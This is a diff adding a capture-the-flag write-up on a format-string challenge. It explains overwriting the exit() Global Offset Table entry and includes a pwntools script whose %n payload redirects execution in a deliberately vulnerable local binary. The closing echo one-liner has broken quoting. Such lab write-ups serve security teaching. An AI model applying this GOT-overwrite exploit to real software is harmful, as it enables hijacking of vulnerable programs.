@@ -364,3 +364,50 @@ int main(int argc, char **argv)
 //gcc -m32 -o format formatfour.c -fno-stack-protector -g -z execstack -W -no-pie
 
 ```
+
+The important thing in this chall is exit() funtion and the same bug in previous chall.
+exit() funtion flow :
+```
+Dump of assembler code for function exit@plt:
+   0x08049070 <+0>:     jmp    DWORD PTR ds:0x804c01c
+   0x08049076 <+6>:     push   0x20
+   0x0804907b <+11>:    jmp    0x8049020
+
+```
+Flow is jmp to value in 0x804c01c. after that, push 0x20 to stack and jmp 0x8049020.
+That mean we can change value in 0x804c01c , it will be jmp where we wanted. This technology is called Global Offset Table (GOT) Simply put, GOT helps load shared library functions (e.g., exit()) in a dynamically-linked ELF binary. Basically, one can create their program without re-writing popular functions like exit(); instead, they can add pointers to call those functions as that they can be dynamically loaded at the run time.
+
+
+We used technology write 2 bytes , now we use it again
+```
+from pwn import *
+
+BIN = "./format"
+DEBUG = 1
+
+exit = 0x804c01c
+exit1 = exit + 0x2
+hello = 0x080491a2
+
+
+def exploit():
+
+  payload = p32(exit) + p32(exit1) + b"%37274d%4$08n" + b"%30306d%5$08n"
+  _breakpoint = """
+      b *0x080491fd
+  """
+  gdb.attach(io, _breakpoint)
+  io.sendline(payload)
+  io.recv()
+  io.interactive()
+
+
+io = process(BIN)
+context.log_level='debug'
+exploit()
+
+
+
+
+# echo `python2 -c "print '\x1c\xc0\x04\x08\x1e\xc0\x04\x08' + "%4\$hn%5$\n"'` | ./format 
+```
